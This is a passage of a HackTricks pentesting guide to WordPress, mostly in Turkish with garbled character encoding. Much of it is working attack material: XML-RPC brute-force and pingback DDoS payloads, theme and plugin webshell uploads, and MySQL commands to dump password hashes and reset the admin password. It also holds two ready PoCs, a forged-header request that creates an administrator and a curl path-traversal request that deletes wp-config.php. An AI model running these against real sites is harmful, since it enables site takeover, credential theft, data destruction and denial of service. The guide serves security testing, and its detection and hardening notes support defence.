# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Uploaded** dosyalarÄ± ÅŸurada bulunur: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** bu yÃ¼zden tema php'sini deÄŸiÅŸtirerek RCE elde etmeyi planlÄ±yorsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanarak **404.php** dosyasÄ±na ÅŸu konumdan **access** edebilirsiniz: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** iÃ§inde veritabanÄ±nÄ±n root parolasÄ±nÄ± bulabilirsiniz.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

- `index.php`
- `license.txt` WordPress'in yÃ¼klÃ¼ sÃ¼rÃ¼mÃ¼ gibi faydalÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` WordPress'in HTTP'yi taÅŸÄ±ma mekanizmasÄ±, XML'i ise kodlama mekanizmasÄ± olarak kullanarak veri iletimine izin veren bir Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼ eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen herhangi bir dosyanÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-sitemap.xml` WordPress 5.5 ve sonraki sÃ¼rÃ¼mlerde, tÃ¼m public gÃ¶nderiler ve public olarak sorgulanabilir gÃ¶nderi tipleri ve taksonomilerle birlikte bir sitemap XML dosyasÄ± oluÅŸturur.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in gereken veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, authentication keys and salts ve veritabanÄ± tablo Ã¶neki gibi bilgileri iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu aktifleÅŸtirmek iÃ§in de kullanÄ±labilir; bu, sorun gidermede faydalÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **Administrator**
- **Editor**: Kendi ve diÄŸerlerinin gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Author**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Contributor**: GÃ¶nderilerini yazar ve yÃ¶netir ama yayÄ±nlayamaz
- **Subscriber**: GÃ¶nderilere gÃ¶z atar ve profilini dÃ¼zenleyebilir

## **Pasif Enumerasyon**

### **Get WordPress version**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sÃ¼rÃ¼mleri Ã§Ä±kar
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Plugins and Themes

Muhtemelen tÃ¼m Plugins and Themes'leri bulamayacaksÄ±nÄ±z. BunlarÄ±n tamamÄ±nÄ± keÅŸfetmek iÃ§in **aktif olarak Plugins and Themes listesine Brute Force uygulamanÄ±z** gerekecek (umarÄ±z ki bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ±, kullanÄ±cÄ± ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, id **geÃ§ersiz**dir.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi edinmek iÃ§in ÅŸu sorgulamayÄ± da deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler aÃ§Ä±ÄŸa Ã§Ä±karabilecek baÅŸka bir `/wp-json/` endpoint'i ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`**'e giriÅŸ yaparken **mesaj** **farklÄ±dÄ±r**, bu **kullanÄ±cÄ± adÄ± var mÄ± yok mu** gÃ¶sterir.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse kimlik bilgilerine yÃ¶nelik brute-force yapabilir veya bunu diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve bu isteÄŸi gÃ¶nderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

`wp.getUserBlogs`, `wp.getCategories` veya `metaWeblog.getUsersBlogs` credentials Ã¼zerinde brute-force yapmak iÃ§in kullanÄ±labilecek bazÄ± yÃ¶ntemlerdir. EÄŸer bunlardan herhangi birini bulursanÄ±z ÅŸu ÅŸekilde bir istek gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geÃ§erli deÄŸilse, 200 kodlu yanÄ±t iÃ§inde _"Incorrect username or password"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
AyrÄ±ca aynÄ± istekte birden fazla kimlik bilgisi deneyebildiÄŸiniz iÃ§in kimlik bilgilerini brute-force etmek iÃ§in **daha hÄ±zlÄ± bir yol** olan **`system.multicall`**'Ä± kullanabilirsiniz:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yÃ¶ntem programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r, insanlar iÃ§in deÄŸil; ayrÄ±ca eski olduÄŸu iÃ§in 2FA'yÄ± desteklemez. Bu yÃ¼zden geÃ§erli creds'iniz varsa ancak ana giriÅŸ 2FA ile korunuyorsa, **xmlrpc.php'yi kÃ¶tÃ¼ye kullanarak bu creds'lerle 2FA'yÄ± atlayarak giriÅŸ yapmayÄ± deneyebilirsiniz**. Konsol Ã¼zerinden yapabildiÄŸiniz tÃ¼m iÅŸlemleri gerÃ§ekleÅŸtiremeyebilirsiniz, ancak Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) videosunda aÃ§Ä±kladÄ±ÄŸÄ± gibi yine de RCE'ye ulaÅŸabilirsiniz.

**DDoS or port scanning**

EÄŸer listede _**pingback.ping**_ yÃ¶ntemini bulabilirseniz Wordpress'in herhangi bir host/port'a keyfi bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, **binlerce** Wordpress **sitesi**ni bir **konuma** **eriÅŸmeye** (dolayÄ±sÄ±yla o konumda bir **DDoS** oluÅŸmasÄ±na) zorlamak iÃ§in kullanÄ±labilir veya **Wordpress**'i bazÄ± dahili bir **aÄŸ**'Ä± **tara**masÄ± iÃ§in kullanabilirsiniz (herhangi bir port belirtebilirsiniz).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan (17) **bÃ¼yÃ¼k** ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Ã–nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakÄ±n; bu yÃ¶ntemi DDoS iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanabileceÄŸinizi Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
When this file is **accessed** a "**heavy**" MySQL **query** is performed, so I could be used by **attackers** to **cause** a **DoS**.\
Also, by default, the `wp-cron.php` is called on every page load (anytime a client requests any Wordpress page), which on high-traffic sites can cause problems (DoS).

It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular interval (without causing issues).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§, **methodName: pingback.ping** ve **/wp-json/oembed/1.0/proxy** yolunun olup olmadÄ±ÄŸÄ±nÄ± kontrol eder ve mevcutlarsa bunlarÄ± exploit etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti deÄŸiÅŸtirerek eriÅŸim elde etme

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok bu bir merak Ã¶rneÄŸidir. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndan 1 biti Ã§evirebiliyordunuz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±ndaki `5389` pozisyonundaki biti NOT (`!`) iÅŸlemini NOPlamak iÃ§in Ã§evirebilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadan bir php dosyasÄ±nÄ± deÄŸiÅŸtirme (admin kimlik bilgileri gerekli)**

Appearance â†’ Theme Editor â†’ 404 Template (saÄŸda)

Ä°Ã§eriÄŸi php shell iÃ§erecek ÅŸekilde deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

GÃ¼ncellenen sayfaya nasÄ±l eriÅŸileceÄŸini internette araÅŸtÄ±rÄ±n. Bu durumda ÅŸu adrese eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
bir oturum elde etmek iÃ§in.

## Plugin RCE

### PHP plugin

.php dosyalarÄ±nÄ± bir plugin olarak yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin php backdoor'unuzu ÅŸu ÅŸekilde oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir eklenti ekleyin:

![](<../../images/image (722).png>)

Eklentiyi yÃ¼kleyin ve "Install Now" butonuna basÄ±n:

![](<../../images/image (249).png>)

"Procced"e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

BÃ¼yÃ¼k olasÄ±lÄ±kla gÃ¶rÃ¼nÃ¼rde hiÃ§bir ÅŸey olmayacaktÄ±r, ancak Media'ya giderseniz yÃ¼klenen shell'i gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸin ve reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yÃ¶ntem, bilinen zafiyetli ve web shell elde etmek iÃ§in sÃ¶mÃ¼rÃ¼lebilecek kÃ¶tÃ¼ amaÃ§lÄ± bir eklentinin kurulmasÄ±nÄ± iÃ§erir. Bu iÅŸlem WordPress dashboard Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Plugin Acquisition**: Eklenti, Exploit DB gibi bir kaynaktan edinilir, Ã¶rneÄŸin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'a gidin, sonra `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- Ä°ndirilen eklentinin zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Plugin Activation**: Eklenti baÅŸarÄ±yla yÃ¼klendikten sonra dashboard Ã¼zerinden aktifleÅŸtirilmelidir.
4. **Exploitation**:
- "reflex-gallery" eklentisi yÃ¼klÃ¼ ve aktif olduÄŸunda, bilindiÄŸi Ã¼zere zafiyetli olduÄŸu iÃ§in sÃ¶mÃ¼rÃ¼lebilir.
- Metasploit framework bu zafiyet iÃ§in bir exploit saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyip belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak siteye yetkisiz eriÅŸim saÄŸlayan bir meterpreter oturumu kurulabilir.
- Bu, bir WordPress sitesini sÃ¶mÃ¼rmek iÃ§in kullanÄ±lan birÃ§ok yÃ¶ntemden sadece biridir.

Ä°Ã§erik, eklentiyi yÃ¼kleme ve aktifleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren gÃ¶rsel aÃ§Ä±klamalar iÃ§erir. Ancak, bu ÅŸekilde zafiyetleri sÃ¶mÃ¼rmenin yetki olmadan yasa dÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu belirtmek Ã¶nemlidir. Bu bilgi sorumlu ÅŸekilde ve sadece yasal bir baÄŸlamda, Ã¶rneÄŸin aÃ§Ä±k izinle yapÄ±lan penetration testing gibi durumlarda kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ WordPress'te bir **Cross-Site Scripting (XSS)** zafiyetini **Remote Code Execution (RCE)** veya diÄŸer kritik zafiyetlere yÃ¼kseltmek iÃ§in tasarlanmÄ±ÅŸ bir script'tir. Daha fazla bilgi iÃ§in [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)'a bakÄ±n. WordPress Versions 6.X.X, 5.X.X and 4.X.X iÃ§in destek saÄŸlar ve ÅŸunlara izin verir:
- _**Privilege Escalation:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ã–zel plugin (backdoor) yÃ¼kleyerek WordPress'e ekleme yapar.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki Built-In Plugins'i dÃ¼zenler.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki Built-In Themes'i dÃ¼zenler.
- _**(Custom) Custom Exploits:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress Plugins/Themes iÃ§in Custom Exploits saÄŸlar.

## Post Exploitation

KullanÄ±cÄ± adlarÄ± ve parolalarÄ± Ã§Ä±kar:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin parolasÄ±nÄ± deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Eklentileri Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini bilmek, o iÅŸlevsellikteki zafiyetleri bulmak iÃ§in kilit Ã¶nemdedir. AÅŸaÄŸÄ±daki madde iÅŸaretlerinde bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini ve zafiyetli eklenti Ã¶rneklerini [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) adresinde bulabilirsiniz.

- **`wp_ajax`**

Bir eklentinin fonksiyonlarÄ± kullanÄ±cÄ±lara aÃ§Ä±ÄŸa Ã§Ä±karma yollarÄ±ndan biri AJAX handler'larÄ± aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bunlar logic, authorization veya authentication ile ilgili hatalar iÃ§erebilir. DahasÄ±, bu fonksiyonlarÄ±n hem authentication hem de authorization'Ä± wordpress nonce'un varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± oldukÃ§a sÄ±k gÃ¶rÃ¼lÃ¼r; bu nonce'a **Wordpress instance'Ä±nda kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ± sahip olabilir** (role baÄŸlÄ± olmaksÄ±zÄ±n).

Bir eklentide bir fonksiyonu aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek fonksiyonlar ÅŸunlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'in herhangi bir kullanÄ±cÄ± tarafÄ±ndan (oturum aÃ§mamÄ±ÅŸ olanlar dahil) eriÅŸilebilir olmasÄ±nÄ± saÄŸlar.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon sadece kullanÄ±cÄ± yetkilendirmesini `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon yalnÄ±zca kullanÄ±cÄ±nÄ±n oturum aÃ§mÄ±ÅŸ olduÄŸunu doÄŸrular; genellikle kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu yÃ¼zden dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸim saÄŸlayabilir.

- **REST API**

wordpress'te `register_rest_route` fonksiyonunu kullanarak fonksiyonlarÄ± REST API Ã¼zerinden aÃ§Ä±ÄŸa Ã§Ä±karmak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback`, belirli bir kullanÄ±cÄ±nÄ±n API metodunu Ã§aÄŸÄ±rmaya yetkili olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir callback fonksiyonudur.

**EÄŸer dahili `__return_true` fonksiyonu kullanÄ±lÄ±rsa, bu kullanÄ±cÄ± izinleri kontrolÃ¼nÃ¼ basitÃ§e atlar.**

- **PHP dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklenti iÃ§indeki dosyalar web'den doÄŸrudan eriÅŸilebilir. Bu nedenle, bir eklenti yalnÄ±zca dosyaya eriÅŸilmesiyle tetiklenen herhangi bir savunmasÄ±z iÅŸlevsellik aÃ§Ä±ÄŸa Ã§Ä±karÄ±yorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan sÃ¶mÃ¼rÃ¼lebilir.

### Trusted-header REST taklit (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± eklentiler dahili entegrasyonlar veya reverse proxy'ler iÃ§in â€œtrusted headerâ€ kÄ±sayollarÄ± uygular ve REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak Ã¼zere bu header'Ä± kullanÄ±r. EÄŸer header yukarÄ± akÄ±ÅŸtaki bir bileÅŸen tarafÄ±ndan istekle kriptografik olarak baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan onu sahteleyebilir ve ayrÄ±calÄ±klÄ± REST yollarÄ±na administrator olarak eriÅŸebilir.

- Impact: kimlik doÄŸrulanmamÄ±ÅŸ (unauthenticated) privilege escalation ile admin'e yÃ¼kselme; core users REST route aracÄ±lÄ±ÄŸÄ±yla yeni bir administrator oluÅŸturarak.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (kullanÄ±cÄ± ID'sini 1 olarak zorlar; tipik olarak ilk administrator hesabÄ±).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden iÅŸe yarÄ±yor

- Eklenti, istemci tarafÄ±ndan kontrol edilen bir header'Ä± kimlik doÄŸrulama durumuna eÅŸliyor ve yetki kontrollerini atlÄ±yor.
- WordPress core bu route iÃ§in `create_users` yetkisini bekler; eklenti hilesi bunu atlayarak baÅŸlÄ±ktan doÄŸrudan geÃ§erli kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlar.

Beklenen baÅŸarÄ± gÃ¶stergeleri

- OluÅŸturulan kullanÄ±cÄ±yÄ± tanÄ±mlayan JSON gÃ¶vdesi ile HTTP 201.
- `wp-admin/users.php` iÃ§inde gÃ¶rÃ¼nen yeni bir admin kullanÄ±cÄ±.

Tespit kontrol listesi

- `getallheaders()`, `$_SERVER['HTTP_...']` veya kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak iÃ§in Ã¶zel header'larÄ± okuyan vendor SDK'larÄ± (Ã¶r. `wp_set_current_user()`, `wp_set_auth_cookie()`) iÃ§in grep yapÄ±n.
- Ä°stek header'larÄ±na dayanan ve saÄŸlam `permission_callback` kontrollerinden yoksun ayrÄ±calÄ±klÄ± callback'ler iÃ§eren REST kayÄ±tlarÄ±nÄ± inceleyin.
- YalnÄ±zca header deÄŸerleri ile korunan REST handler'larÄ± iÃ§inde Ã§ekirdek kullanÄ±cÄ± yÃ¶netimi fonksiyonlarÄ± (`wp_insert_user`, `wp_create_user`) kullanÄ±mÄ±na bakÄ±n.

SertleÅŸtirme

- Kimlik doÄŸrulamayÄ± veya yetkilendirmeyi asla istemci kontrollÃ¼ header'lardan tÃ¼retmeyin.
- EÄŸer bir reverse proxy kimlik enjekte etmek zorundaysa, gÃ¼veni proxy'de sonlandÄ±rÄ±n ve gelen kopyalarÄ± kenarda temizleyin (Ã¶r. edge'de `unset X-Wcpay-Platform-Checkout-User`), ardÄ±ndan imzalÄ± bir token iletin ve sunucu tarafÄ±nda doÄŸrulayÄ±n.
- Yetkili iÅŸlemler yapan REST route'larÄ± iÃ§in `current_user_can()` kontrolleri ve katÄ± bir `permission_callback` gerektirin (asla `__return_true` kullanmayÄ±n).
- Header â€œimpersonationâ€ yerine birinci taraf auth (cookies, application passwords, OAuth) tercih edin.

Referanslar: genel vaka ve daha geniÅŸ analiz iÃ§in bu sayfanÄ±n sonundaki linklere bakÄ±n.

### wp_ajax_nopriv Ã¼zerinden YetkilendirilmemiÅŸ Keyfi Dosya Silme (Litho Theme <= 3.0)

WordPress tema ve eklentileri genellikle `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± Ã¼zerinden AJAX iÅŸleyicileri aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **callback yetkilendirilmemiÅŸ ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu yÃ¼zden herhangi bir hassas iÅŸlem ayrÄ±ca ÅŸunlarÄ± uygulamalÄ±dÄ±r:

1. Bir **yetki kontrolÃ¼** (Ã¶r. `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce'u**, ve
3. **SÄ±kÄ± giriÅŸ sanitizasyonu/doÄŸrulamasÄ±**.

Litho Ã§ok amaÃ§lÄ± tema (< 3.1) *Remove Font Family* Ã¶zelliÄŸinde bu 3 kontrolÃ¼ unutmuÅŸ ve aÅŸaÄŸÄ±daki kodu (basitleÅŸtirilmiÅŸ) gÃ¶ndermiÅŸtir:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Kimlik doÄŸrulamasÄ± olmadan eriÅŸim** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ herhangi bir ziyaretÃ§i endpoint'e eriÅŸebilir.
* **Yol temizleme yok** â€“ kullanÄ±cÄ± tarafÄ±ndan kontrol edilen `fontfamily` stringi filtrelenmeden bir dosya sistemi yoluna ekleniyor, bu da klasik `../../` traversal'a izin veriyor.

#### Exploitation

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek **uploads temel dizini altÄ±ndaki** (genellikle `<wp-root>/wp-content/uploads/`) herhangi bir dosya veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

